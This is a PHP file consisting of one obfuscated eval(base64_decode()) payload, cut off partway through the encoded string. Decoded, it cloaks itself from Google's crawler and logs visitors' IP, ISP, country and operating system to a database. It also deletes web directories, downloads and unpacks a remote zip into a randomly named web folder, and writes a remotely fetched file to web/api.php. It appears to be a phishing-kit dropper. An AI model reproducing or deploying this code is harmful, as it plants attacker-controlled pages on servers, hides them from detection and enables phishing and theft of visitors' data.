<?php eval(base64_decode('CiBnb3RvIFpuVUFEOyBxaHNnRjogaWYgKCFDdWJfSlJSRF9PUCgkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dikpIHsgJHNob3dwaXAgPSAiXDQxXHgyMVw0MSI7IGVjaG8gJHNob3dwaXA7IGRpZTsgfSBnb3RvIHBiZjhEOyBjUV9IVTogaWYgKHN0cnBvcygkdXNlckFnZW50LCAiXHg2N1wxNTdcMTU3XDE0N1wxNTRcMTQ1IikgIT09IGZhbHNlKSB7ICRyZWZpeCA9ICJcMTAyXDE1N1wxNjNcMTQ1XHgyMFx4NDciOyBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpOyBkaWU7IH0gZ290byB6V3dIUjsgQ1lZY3Q6IGZ1bmN0aW9uIHJhbmRfbnVtKCRsZW5ndGgpIHsgJGNoYXJhY3RlcnMgPSAiXDYwXDYxXHgzMlw2M1w2NFx4MzVcNjZceDM3XDcwXDcxIjsgJGNoYXJhY3RlcnNMZW5ndGggPSBzdHJsZW4oJGNoYXJhY3RlcnMpOyAkcmFuZG9tU3RyaW5nID0gJyc7IGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsgJHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1tyYW5kKDAsICRjaGFyYWN0ZXJzTGVuZ3RoIC0gMSldOyB9IHJldHVybiAkcmFuZG9tU3RyaW5nOyB9IGdvdG8gb1V1NjY7IEVaMXFZOiAkX1NFU1NJT05bIlx4NDJcMTU0XDE0MVwxNjNceDYxXDE0M1wxNTdceDc1XDE1NiJdID0gaXNzZXQoJGluZm9bIlwxNDNceDZmXHg3NVwxNTZcMTY0XDE2Mlx4NzkiXSkgPyAkaW5mb1siXHg2M1wxNTdcMTY1XDE1NlwxNjRceDcyXHg3OSJdIDogbnVsbDsgZ290byBCSzlQTjsgb25nY2Y6ICRJcENvdW50ID0gRk94X1RHSF9YKCR1c2VyQWdlbnQpOyBnb3RvIHhGejk2OyBzYUVDajogJGRvbWluZSA9ICRfU0VSVkVSWyJceDUzXDEwNVx4NTJceDU2XHg0NVwxMjJcMTM3XHg0ZVx4NDFcMTE1XHg0NSJdOyBnb3RvIFBMVEtaOyB4Rno5NjogZnVuY3Rpb24gY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KSB7ICR1c2VyQWdlbnQgPSBpc3NldCgkX1NFUlZFUlsiXHg0OFwxMjRcMTI0XHg1MFwxMzdceDU1XHg1M1wxMDVcMTIyXHg1Zlx4NDFcMTA3XHg0NVwxMTZceDU0Il0pID8gJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFwxMjBcMTM3XHg1NVx4NTNcMTA1XDEyMlwxMzdcMTAxXDEwN1wxMDVcMTE2XHg1NCJdIDogJyc7ICRpc3AgPSAkX1NFU1NJT05bIlx4NjlcMTYzXHg3MCJdOyAkSXBDb3VudCA9IEZPeF9UR0hfWCgkdXNlckFnZW50KTsgJE9LSklWR1JEID0gSFlUX0REUl9VaW8oJHVzZXJBZ2VudCk7ICRkb25mbGFnID0gJF9TRVJWRVJbIlwxMjNcMTA1XHg1Mlx4NTZceDQ1XDEyMlx4NWZcMTE2XDEwMVx4NGRcMTA1Il07ICRMT0NBTE9fVEVNUE8gPSBkYXRlKCJcMTMxXHgyZFx4NmRcNTVceDY0XDQwXDExMFw3MlwxNTFcNzJceDczIik7ICRCbGFzYWNvdW4gPSAkX1NFU1NJT05bIlx4NDJcMTU0XHg2MVx4NzNcMTQxXHg2M1wxNTdcMTY1XDE1NiJdOyAkTmpvcGYgPSAkX1NFU1NJT05bIlwxMTZcMTUyXHg2Zlx4NzBcMTQ2Il07ICRWb3BydCA9ICRfU0VTU0lPTlsiXHg1NlwxNTdcMTYwXDE2MlwxNjQiXTsgJHhPcHV5ID0gJF9TRVNTSU9OWyJcMTcwXHg0Zlx4NzBcMTY1XHg3OSJdOyAkaG9zdCA9IGdldGhvc3RieWFkZHIoJFN0cnVwTG9tKTsgJGRiID0gbXlzcWxpX2Nvbm5lY3QoJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2KTsgaWYgKCEkZGIpIHsgZGllKCJcMTAzXDE1N1x4NmVceDZlXDE0NVwxNDNceDc0XHg2OVx4NmZcMTU2XDQwXDE0NlwxNDFceDY5XHg2Y1x4NjVceDY0XHgzYVx4MjAiIC4gbXlzcWxpX2Nvbm5lY3RfZXJyb3IoKSk7IH0gJHNxbF91ID0gIlx4NTNceDQ1XHg0Y1wxMDVcMTAzXHg1NFx4MjBcNTJcNDBcMTA2XDEyMlwxMTdcMTE1XHgyMFx4NmNcMTU3XHg2N1x4NzNceDIwXDEyN1wxMTBcMTA1XDEyMlwxMDVcNDBcMTUxXDE2MFwxNDFcMTQ0XHg2NFx4NzJceDY1XDE2M1x4M2RceDI3eyRTdHJ1cExvbX1ceDI3IjsgJHJlc191ID0gbXlzcWxpX3F1ZXJ5KCRkYiwgJHNxbF91KTsgaWYgKG15c3FsaV9udW1fcm93cygkcmVzX3UpID4gMCkgeyBteXNxbGlfY2xvc2UoJGRiKTsgZWNobyAiXDQxXDQxIjsgZGllOyB9IGVsc2UgeyAkU3RydXBMb20gPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlw0NyIsICcnLCAkU3RydXBMb20pKTsgJEJsYXNhY291biA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXDQ3IiwgJycsICRCbGFzYWNvdW4pKTsgJElwQ291bnQgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlw0NyIsICcnLCAkSXBDb3VudCkpOyAkT0tKSVZHUkQgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgc3RyX3JlcGxhY2UoIlx4MjciLCAnJywgJE9LSklWR1JEKSk7ICRkb25mbGFnID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJcNDciLCAnJywgJGRvbmZsYWcpKTsgJExPQ0FMT19URU1QTyA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXHgyNyIsICcnLCAkTE9DQUxPX1RFTVBPKSk7ICRob3N0ID0gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkZGIsIHN0cl9yZXBsYWNlKCJcNDciLCAnJywgJGhvc3QpKTsgJGlzcCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXHgyNyIsICcnLCAkaXNwKSk7ICRyZWZpeCA9IG15c3FsaV9yZWFsX2VzY2FwZV9zdHJpbmcoJGRiLCBzdHJfcmVwbGFjZSgiXDQ3IiwgJycsICRyZWZpeCkpOyAkcXVlcnkgPSAiXDExMVx4NGVcMTIzXDEwNVwxMjJcMTI0XDQwXDExMVwxMTZceDU0XDExN1x4MjBceDZjXHg2ZlwxNDdceDczXDQwXHgyOFx4NjlceDcwXDE0MVx4NjRceDY0XDE2MlwxNDVcMTYzXDU0XDE0M1x4NmZceDc1XDE1NlwxNjRceDcyXDE3MVx4MmNcMTQyXDE2MlwxNTdcMTY3XHg3M1x4NjVcMTYyXDU0XDE1N1wxNjNcNTRcMTQ0XDE1N1wxNTVcMTUxXHg2ZVx4NjVcNTRceDZkXDE3MVx4NzRceDY5XHg2ZFwxNDVceDJjXDE1MFwxNTdcMTYzXHg3NFx4MmNceDY5XDE2M1x4NzBceDJjXHg3Mlx4NjVcMTYzXDE1N1x4NmVcNTFcNDBcMTJceDIwXDQwXHgyMFw0MFw0MFw0MFwxMVx4MjBceDIwXDQwXHgyMFx4OVx4MjBcNDBceDU2XHg0MVx4NGNceDU1XDEwNVx4NTNceDIwXHgyOFx4Mjd7JFN0cnVwTG9tfVx4MjdcNTRceDI3eyRCbGFzYWNvdW59XDQ3XDU0XDQ3eyRJcENvdW50fVw0N1x4MmNcNDd7JE9LSklWR1JEfVx4MjdcNTRcNDd7JGRvbmZsYWd9XDQ3XHgyY1x4Mjd7JExPQ0FMT19URU1QT31cNDdcNTRceDI3eyRob3N0fVx4MjdceDJjXHgyN3skaXNwfVx4MjdceDJjXHgyN3skcmVmaXh9XDQ3XHgyOSI7ICRyZXN1bHRzID0gbXlzcWxpX3F1ZXJ5KCRkYiwgJHF1ZXJ5KTsgbXlzcWxpX2Nsb3NlKCRkYik7IGVjaG8gIlw0MSI7IH0gfSBnb3RvIGNRX0hVOyBjR1FxUzogJHVzZXJBZ2VudCA9IGlzc2V0KCRfU0VSVkVSWyJceDQ4XHg1NFx4NTRcMTIwXDEzN1wxMjVcMTIzXHg0NVwxMjJceDVmXHg0MVwxMDdceDQ1XHg0ZVwxMjQiXSkgPyAkX1NFUlZFUlsiXDExMFx4NTRcMTI0XHg1MFx4NWZceDU1XHg1M1x4NDVcMTIyXHg1Zlx4NDFcMTA3XDEwNVwxMTZcMTI0Il0gOiAnJzsgZ290byB3SFp3UDsgQTNnVUk6ICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY3VybCk7IGdvdG8gRHVlXzE7IEx3QXZfOiBpZiAoIWVtcHR5KCRfU0VSVkVSWyJceDQ4XHg1NFwxMjRcMTIwXDEzN1wxMDNcMTE0XHg0OVx4NDVcMTE2XDEyNFx4NWZcMTExXDEyMCJdKSkgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlx4NDhceDU0XHg1NFx4NTBcMTM3XDEwM1wxMTRceDQ5XHg0NVx4NGVceDU0XDEzN1wxMTFcMTIwIl07IH0gZWxzZWlmICghZW1wdHkoJF9TRVJWRVJbIlx4NDhceDU0XHg1NFwxMjBceDVmXDEzMFwxMzdceDQ2XDExN1x4NTJcMTI3XHg0MVx4NTJcMTA0XHg0NVwxMDRcMTM3XDEwNlwxMTdceDUyIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXHg0OFx4NTRceDU0XDEyMFwxMzdceDU4XHg1ZlwxMDZcMTE3XHg1Mlx4NTdceDQxXHg1MlwxMDRceDQ1XHg0NFwxMzdceDQ2XDExN1x4NTIiXTsgfSBlbHNlIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJcMTIyXDEwNVx4NGRcMTE3XDEyNFx4NDVcMTM3XHg0MVwxMDRcMTA0XHg1MiJdOyB9IGdvdG8gTVBYczc7IE9HR2l6OiBmdW5jdGlvbiBDdWJfSlJSRF9PUCgkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dikgeyAkZGIgPSBteXNxbGlfY29ubmVjdCgkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYpOyBpZiAoISRkYikgeyBkaWUoIlx4NDNcMTU3XDE1Nlx4NmVcMTQ1XDE0M1x4NzRcMTUxXDE1N1wxNTZcNDBcMTQ2XHg2MVwxNTFcMTU0XDE0NVx4NjRcNzJceDIwIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkpOyB9ICRzcWxfdSA9ICJceDUzXDEwNVwxMTRceDQ1XDEwM1wxMjRceDIwXHgyYVx4MjBcMTA2XHg1MlwxMTdceDRkXHgyMFwxNTRcMTU3XDE0N1wxNjNceDIwXDEyN1wxMTBcMTA1XDEyMlx4NDVcNDBceDY5XHg3MFwxNDFcMTQ0XDE0NFwxNjJcMTQ1XDE2M1x4M2RceDI3eyRTdHJ1cExvbX1ceDI3IjsgJHJlc191ID0gbXlzcWxpX3F1ZXJ5KCRkYiwgJHNxbF91KTsgaWYgKG15c3FsaV9udW1fcm93cygkcmVzX3UpID4gMCkgeyBteXNxbGlfY2xvc2UoJGRiKTsgcmV0dXJuIGZhbHNlOyB9IG15c3FsaV9jbG9zZSgkZGIpOyByZXR1cm4gdHJ1ZTsgfSBnb3RvIHFoc2dGOyBCVEZwNjogJF9TRVNTSU9OWyJceDY5XHg3M1x4NzAiXSA9IGlzc2V0KCRpbmZvWyJcMTUxXHg3M1x4NzAiXSkgPyAkaW5mb1siXHg2OVwxNjNceDcwIl0gOiBudWxsOyBnb3RvIEVaMXFZOyBiT1NlcjogJHBhcmVudERpcmVjdG9yeSA9ICJceDc3XDE0NVx4NjIiOyBnb3RvIGhWNmoyOyBiRDZNcjogaWYgKGlzc2V0KCRfUE9TVFsiXHg3M1wxNTBceDZmXDE2MFwxNTFceDY0Il0pKSB7ICRnYW1laWQgPSAkX1BPU1RbIlx4NzNceDY4XDE1N1wxNjBceDY5XHg2NCJdOyAkX1NFU1NJT05bIlwxNTRceDZmXDE1NFwxNjNcMTU3XDE2NVx4NmNceDczIl0gPSAkZ2FtZWlkOyBSRElPUEIoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRnYW1laWQpOyB9IGdvdG8gYm5FTmQ7IER1ZV8xOiBjdXJsX2Nsb3NlKCRjdXJsKTsgZ290byBCVGMycjsgRFI4d1o6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXHgyZSIpIHsgaWYgKGRlbGV0ZURpcmVjdG9yeSgkZGlyKSkgeyB9IH0gfSB9IGdvdG8gT0dHaXo7IE1QWHM3OiAkaXBQb3J0QXJyYXkgPSBleHBsb2RlKCJceDNhIiwgJGlwQWRkcmVzcyk7IGdvdG8gTFVyN1o7IGhWNmoyOiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXDU3XHgyYSIsIEdMT0JfT05MWURJUik7IGdvdG8gRFI4d1o7IGJ2RzkwOiAkZG9tYWluID0gJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFwxMjBcMTM3XDExMFx4NGZceDUzXDEyNCJdOyBnb3RvIGMwelRiOyBwTTR4NzogJFJhbmRPUF9NID0gUmFuZF9YRF9URihyYW5kKDcsIDcpKTsgZ290byBSNlVEWDsgb1V1NjY6IGZ1bmN0aW9uIEhZVF9ERFJfVWlvKCRVU0VSX0FHRU5UKSB7ICRPU19FUlJPUiA9ICJceDU1XHg2ZVwxNTNcMTU2XDE1N1x4NzdcMTU2XHgyMFwxMTdceDUzXHgyMFwxMjBcMTU0XHg2MVwxNjRcMTQ2XDE1N1wxNjJcMTU1IjsgJE9TID0gYXJyYXkoIlw1N1wxNjdcMTUxXDE1Nlx4NjRcMTU3XHg3N1x4NzNceDIwXHg2ZVwxNjRceDIwXDYxXHgzMFx4MmZceDY5IiA9PiAiXDEyN1wxNTFceDZlXHg2NFx4NmZcMTY3XHg3M1w0MFw2MVw2MCIsICJceDJmXHg3N1x4NjlceDZlXDE0NFwxNTdcMTY3XHg3M1w0MFx4NmVceDc0XDQwXDY2XHgyZVx4MzNcNTdcMTUxIiA9PiAiXDEyN1wxNTFceDZlXDE0NFx4NmZceDc3XHg3M1x4MjBcNzBceDJlXDYxIiwgIlw1N1x4NzdceDY5XDE1Nlx4NjRceDZmXHg3N1x4NzNceDIwXHg2ZVwxNjRceDIwXHgzNlw1Nlx4MzJceDJmXHg2OSIgPT4gIlwxMjdcMTUxXDE1Nlx4NjRcMTU3XHg3N1wxNjNcNDBceDM4IiwgIlw1N1wxNjdcMTUxXHg2ZVwxNDRceDZmXDE2N1wxNjNceDIwXDE1NlwxNjRcNDBcNjZcNTZceDMxXHgyZlwxNTEiID0+ICJcMTI3XHg2OVx4NmVcMTQ0XDE1N1wxNjdcMTYzXDQwXDY3IiwgIlx4MmZceDc3XHg2OVx4NmVceDY0XDE1N1x4NzdceDczXDQwXDE1Nlx4NzRcNDBcNjZcNTZceDMwXHgyZlx4NjkiID0+ICJceDU3XHg2OVx4NmVcMTQ0XHg2ZlwxNjdcMTYzXDQwXDEyNlx4NjlceDczXHg3NFx4NjEiLCAiXHgyZlwxNjdceDY5XHg2ZVx4NjRceDZmXDE2N1wxNjNceDIwXHg2ZVx4NzRcNDBceDM1XDU2XDYyXDU3XHg2OSIgPT4gIlx4NTdceDY5XHg2ZVx4NjRcMTU3XHg3N1x4NzNcNDBcMTIzXDE0NVx4NzJceDc2XHg2NVwxNjJcNDBcNjJcNjBcNjBcNjNcNTdceDU4XHg1MFw0MFwxNzBceDM2XHgzNCIsICJcNTdceDc3XDE1MVwxNTZceDY0XHg2ZlwxNjdcMTYzXHgyMFx4NmVceDc0XHgyMFx4MzVcNTZceDMxXDU3XHg2OSIgPT4gIlwxMjdcMTUxXHg2ZVwxNDRcMTU3XDE2N1x4NzNcNDBcMTMwXDEyMCIsICJcNTdceDc3XDE1MVwxNTZceDY0XDE1N1x4NzdcMTYzXHgyMFwxNzBceDcwXDU3XDE1MSIgPT4gIlx4NTdceDY5XHg2ZVwxNDRcMTU3XDE2N1x4NzNceDIwXDEzMFx4NTAiLCAiXHgyZlx4NzdcMTUxXHg2ZVwxNDRceDZmXDE2N1wxNjNceDIwXHg2ZVwxNjRcNDBceDM1XHgyZVw2MFw1N1x4NjkiID0+ICJcMTI3XDE1MVx4NmVcMTQ0XDE1N1x4NzdceDczXHgyMFw2Mlx4MzBceDMwXHgzMCIsICJcNTdceDc3XDE1MVx4NmVcMTQ0XHg2Zlx4NzdcMTYzXHgyMFwxNTVceDY1XDU3XDE1MSIgPT4gIlwxMjdceDY5XHg2ZVwxNDRcMTU3XHg3N1x4NzNceDIwXDExNVx4NDUiLCAiXHgyZlwxNjdceDY5XDE1Nlx4MzlceDM4XHgyZlwxNTEiID0+ICJceDU3XDE1MVwxNTZcMTQ0XHg2ZlwxNjdceDczXDQwXHgzOVw3MCIsICJcNTdceDc3XHg2OVx4NmVceDM5XDY1XDU3XDE1MSIgPT4gIlwxMjdcMTUxXHg2ZVx4NjRcMTU3XHg3N1x4NzNceDIwXHgzOVw2NSIsICJcNTdcMTY3XHg2OVx4NmVcNjFceDM2XHgyZlx4NjkiID0+ICJcMTI3XHg2OVx4NmVceDY0XDE1N1x4NzdcMTYzXDQwXDYzXDU2XHgzMVw2MSIsICJceDJmXHg2ZFx4NjFcMTQzXDE1MVx4NmVceDc0XHg2ZlwxNjNcMTUwXDE3NFx4NmRcMTQxXDE0M1x4MjBceDZmXHg3M1w0MFx4NzhceDJmXHg2OSIgPT4gIlx4NGRceDYxXDE0M1w0MFwxMTdcMTIzXDQwXDEzMCIsICJceDJmXHg2ZFwxNDFcMTQzXDEzN1x4NzBcMTU3XDE2N1wxNDVcMTYyXDE2MFx4NjNceDJmXDE1MSIgPT4gIlx4NGRceDYxXHg2M1x4MjBceDRmXHg1M1x4MjBceDM5IiwgIlw1N1wxNTRcMTUxXDE1Nlx4NzVceDc4XDU3XHg2OSIgPT4gIlwxMTRcMTUxXDE1NlwxNjVceDc4IiwgIlx4MmZceDc1XHg2Mlx4NzVcMTU2XHg3NFwxNjVceDJmXDE1MSIgPT4gIlx4NTVceDYyXHg3NVx4NmVceDc0XHg3NSIsICJceDJmXHg2OVwxNjBcMTUwXDE1N1wxNTZceDY1XHgyZlwxNTEiID0+ICJcMTUxXHg1MFwxNTBcMTU3XHg2ZVwxNDUiLCAiXDU3XHg2OVx4NzBcMTU3XDE0NFx4MmZcMTUxIiA9PiAiXHg2OVwxMjBcMTU3XDE0NCIsICJcNTdcMTUxXDE2MFwxNDFceDY0XDU3XHg2OSIgPT4gIlwxNTFcMTIwXDE0MVx4NjQiLCAiXDU3XDE0MVwxNTZceDY0XHg3Mlx4NmZceDY5XHg2NFx4MmZcMTUxIiA9PiAiXHg0MVwxNTZceDY0XDE2Mlx4NmZceDY5XDE0NCIsICJceDJmXHg2MlwxNTRceDYxXHg2M1wxNTNceDYyXDE0NVx4NzJceDcyXDE3MVx4MmZcMTUxIiA9PiAiXDEwMlwxNTRceDYxXHg2M1wxNTNcMTAyXDE0NVx4NzJceDcyXDE3MSIsICJceDJmXHg3N1x4NjVceDYyXDE1N1x4NzNcNTdcMTUxIiA9PiAiXHg0ZFwxNTdcMTQyXDE1MVx4NmNceDY1Iik7IGZvcmVhY2ggKCRPUyBhcyAkcmVnZXggPT4gJHZhbHVlKSB7IGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7ICRPU19FUlJPUiA9ICR2YWx1ZTsgfSB9IHJldHVybiAkT1NfRVJST1I7IH0gZ290byB0SENfOTsgVXBCQ3I6IGlmICgkX1NFUlZFUlsiXDEyMlwxMDVceDUxXDEyNVx4NDVceDUzXDEyNFwxMzdcMTE1XDEwNVwxMjRcMTEwXDExN1x4NDQiXSA9PT0gIlx4NTBceDRmXHg1M1x4NTQiKSB7IGlmICghaXNzZXQoJF9QT1NUWyJcMTU0XHg2Zlx4NjNceDYxXHg2Y1wxNTFceDcwIl0pKSB7ICRyZWZpeCA9ICJcMTExXHg2ZVwxNjZceDYxXDE1NFx4NjlceDY0XDQwXDExMVx4NTBcMTIzIjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IGlmICghaXNzZXQoJF9QT1NUWyJceDczXDE1MFx4NmZceDcwXHg2OVwxNDQiXSkpIHsgJHJlZml4ID0gIlx4NDlcMTU2XHg3NlwxNDFceDZjXHg2OVwxNDRcNDBceDQ5XHg0NFx4MjBceDUzXDEyMVwxMTQiOyBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpOyBkaWU7IH0gaWYgKCFpc19kaXIoIlwxNjdcMTQ1XDE0MiIpKSB7IGlmICghbWtkaXIoIlx4NzdceDY1XDE0MiIsIDUxMSkpIHsgZGllKCJceDQ2XDE0MVwxNTFcMTU0XDE0NVx4NjRceDIwXDE2NFx4NmZcNDBcMTQzXHg3MlwxNDVceDYxXHg3NFx4NjVcNDBceDc3XDE0NVx4NjJcNDBcMTQ0XDE1MVx4NzJceDY1XDE0M1x4NzRceDZmXDE2MlwxNzEiKTsgfSB9ICRmb2xkZXJfbmFtZSA9IGJpbjJoZXgocmFuZG9tX2J5dGVzKDgpKTsgJHN1Yl9mb2xkZXIgPSByYW5kX251bSg0KTsgJGZvbGRlcl9wYXRoID0gIlwxNjdcMTQ1XDE0Mlx4MmZ7JHN1Yl9mb2xkZXJ9XDU3IjsgJHppcEZpbGVVcmwgPSAkX1NFU1NJT05bIlwxNjVceDcyXDE1NCJdOyAkdGVtcERpciA9ICJcMTY0XHg2NVx4NmRcMTYwIjsgaWYgKCFpc19kaXIoJHRlbXBEaXIpKSB7IG1rZGlyKCR0ZW1wRGlyKTsgfSAkemlwRmlsZU5hbWUgPSAieyR0ZW1wRGlyfVx4MmZ7JGZvbGRlcl9uYW1lfVw1Nlx4N2FcMTUxXHg3MCI7IGlmIChjb3B5KCR6aXBGaWxlVXJsLCAkemlwRmlsZU5hbWUpKSB7IGlmICghbWtkaXIoJGZvbGRlcl9wYXRoLCA1MTEsIHRydWUpKSB7IGRpZSgiXHg0Nlx4NjFcMTUxXHg2Y1wxNDVcMTQ0XDQwXDE2NFwxNTdceDIwXHg2M1wxNjJceDY1XHg2MVx4NzRcMTQ1XDQwXDE2NFwxNTBceDY1XHgyMFwxNDZceDZmXHg2Y1x4NjRceDY1XDE2Mlw1NiIpOyB9ICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOyBpZiAoJHppcC0+b3BlbigkemlwRmlsZU5hbWUpID09PSB0cnVlKSB7ICR6aXAtPmV4dHJhY3RUbygkZm9sZGVyX3BhdGgpOyAkemlwLT5jbG9zZSgpOyAkZXh0cmFjdGVkRmlsZXMgPSBzY2FuZGlyKCRmb2xkZXJfcGF0aCk7IGZvcmVhY2ggKCRleHRyYWN0ZWRGaWxlcyBhcyAkZmlsZSkgeyBpZiAoJGZpbGUgIT09ICJceDJlIiAmJiAkZmlsZSAhPT0gIlx4MmVceDJlIikgeyByZW5hbWUoJGZvbGRlcl9wYXRoIC4gIlw1NyIgLiAkZmlsZSwgJGZvbGRlcl9wYXRoIC4gJGZpbGUpOyB9IH0gfSBlbHNlIHsgZWNobyAiXDEwNlwxNDFcMTUxXHg2Y1x4NjVcMTQ0XDQwXDE2NFwxNTdceDIwXDE0NVwxNzBceDc0XHg3MlwxNDFcMTQzXHg3NFx4MjBceDc0XDE1MFwxNDVcNDBceDdhXDE1MVwxNjBcNDBceDY2XDE1MVwxNTRceDY1XHgyZSI7IH0gfSBlbHNlIHsgZGllKCJcMTA2XDE0MVwxNTFcMTU0XHg2NVx4NjRceDIwXDE2NFx4NmZceDIwXDE0NFwxNTdceDc3XDE1NlwxNTRceDZmXHg2MVwxNDRceDIwXDE2NFx4NjhcMTQ1XDQwXDE3Mlx4NjlcMTYwXHgyMFwxNDZcMTUxXDE1NFwxNDVcNTYiKTsgfSBpZiAoZmlsZV9leGlzdHMoJHppcEZpbGVOYW1lKSkgeyB1bmxpbmsoJHppcEZpbGVOYW1lKTsgfSAkZ2FtZWlkID0gJF9TRVNTSU9OWyJcMTU0XDE1N1wxNTRceDczXHg2ZlwxNjVceDZjXDE2MyJdOyAkX1NFU1NJT05bIlx4NmNcMTU3XDE0M1x4NjFceDZjXDE0NFwxNTFceDcyIl0gPSAieyRmb2xkZXJfcGF0aH0iOyBmaWxlX3B1dF9jb250ZW50cygieyRmb2xkZXJfcGF0aH1cNTdcMTU0XHg2ZlwxNDNceDYxXHg2Y1w1Nlx4NzRceDc4XDE2NCIsICJ7JFN0cnVwTG9tfVwxMiIsIEZJTEVfQVBQRU5EKTsgJGZpbGVVUkwgPSAkX1NFU1NJT05bIlwxNDFceDcwXDE1MSJdOyBmdW5jdGlvbiBnZXRGaWxlQ29udGVudHMoJGZpbGVVUkwpIHsgJGN1cmwgPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfVVJMLCAkZmlsZVVSTCk7IGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjdXJsKTsgJHN0YXR1c0NvZGUgPSBjdXJsX2dldGluZm8oJGN1cmwsIENVUkxJTkZPX0hUVFBfQ09ERSk7ICRlcnJvciA9IGN1cmxfZXJyb3IoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJsKTsgaWYgKCRzdGF0dXNDb2RlID09PSAyMDAgJiYgZW1wdHkoJGVycm9yKSkgeyByZXR1cm47IH0gJGZpbGVDb250ZW50cyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlVVJMKTsgaWYgKCRmaWxlQ29udGVudHMgIT09IGZhbHNlKSB7ICRsb2NhbEZpbGVQYXRoID0gIlwxNjdceDY1XHg2Mlx4MmZcMTQxXHg3MFwxNTFcNTZceDcwXHg2OFwxNjAiOyBmaWxlX3B1dF9jb250ZW50cygkbG9jYWxGaWxlUGF0aCwgJGZpbGVDb250ZW50cyk7IH0gfSBpZiAoJGZpbGVVUkwgIT09ICJceDQxXDEyMFx4NDkiKSB7IGdldEZpbGVDb250ZW50cygkZmlsZVVSTCk7IH0gJGxvY2FsaXAgPSBpc3NldCgkX1BPU1RbIlx4NmNcMTU3XDE0M1x4NjFceDZjXHg2OVwxNjAiXSkgPyAkX1BPU1RbIlx4NmNceDZmXDE0M1x4NjFceDZjXDE1MVwxNjAiXSA6IG51bGw7ICRkb21haW5uYW1lID0gaXNzZXQoJF9QT1NUWyJceDY0XDE1N1wxNTVceDYxXDE1MVwxNTZceDZlXDE0MVx4NmRceDY1Il0pID8gJF9QT1NUWyJcMTQ0XHg2ZlwxNTVceDYxXHg2OVwxNTZceDZlXDE0MVwxNTVcMTQ1Il0gOiBudWxsOyAkbmV4dGRvbWFpbiA9IGlzc2V0KCRfUE9TVFsiXHg2ZVwxNDVcMTcwXHg3NFx4NjRceDZmXHg2ZFwxNDFceDY5XHg2ZSJdKSA/ICRfUE9TVFsiXHg2ZVwxNDVcMTcwXHg3NFx4NjRcMTU3XDE1NVx4NjFceDY5XDE1NiJdIDogbnVsbDsgJHNob3BpZCA9IGlzc2V0KCRfUE9TVFsiXHg3M1wxNTBceDZmXHg3MFx4NjlcMTQ0Il0pID8gJF9QT1NUWyJceDczXDE1MFwxNTdceDcwXHg2OVx4NjQiXSA6IG51bGw7IGlmICgkbG9jYWxpcCAhPT0gbnVsbCAmJiAkZG9tYWlubmFtZSAhPT0gbnVsbCAmJiAkbmV4dGRvbWFpbiAhPT0gbnVsbCAmJiAkc2hvcGlkICE9PSBudWxsKSB7ICRkaXJlY3RvcnkgPSAiXHg3NFwxNDVceDZkXDE2MCI7ICR6aXBGaWxlcyA9IGdsb2IoJGRpcmVjdG9yeSAuICJcNTJceDJlXHg3YVx4NjlceDcwIik7IGlmICghZW1wdHkoJHppcEZpbGVzKSkgeyBmb3JlYWNoICgkemlwRmlsZXMgYXMgJHppcEZpbGUpIHsgaWYgKGlzX2ZpbGUoJHppcEZpbGUpKSB7IHVubGluaygkemlwRmlsZSk7IH0gfSB9ICRyZXNwb25zZURhdGEgPSBhcnJheSgi